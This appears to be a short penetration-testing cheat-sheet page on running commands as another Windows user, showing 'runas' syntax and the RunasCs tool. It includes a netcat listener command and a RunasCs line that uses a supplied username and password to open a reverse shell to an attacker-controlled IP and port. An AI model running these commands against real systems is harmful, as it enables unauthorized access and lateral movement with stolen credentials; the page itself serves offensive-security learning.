# Switch User on Windows

### Runas <a href="#runas" id="runas"></a>

```
runas /user:<username> cmd
runas /user:<domain>\<username> cmd
```

### RunasCS <a href="#runascs" id="runascs"></a>

We can spawn another shell as another user with [RunasCS](https://github.com/antonioCoco/RunasCs).\
First, start a listener on local machine.

```
nc -lvnp 4444
```

Then execute the following command on target machine.\
Replace `10.0.0.1:4444` with your local IP and port.

```
RunasCs.exe <username> <password> cmd -r 10.0.0.1:4444
```
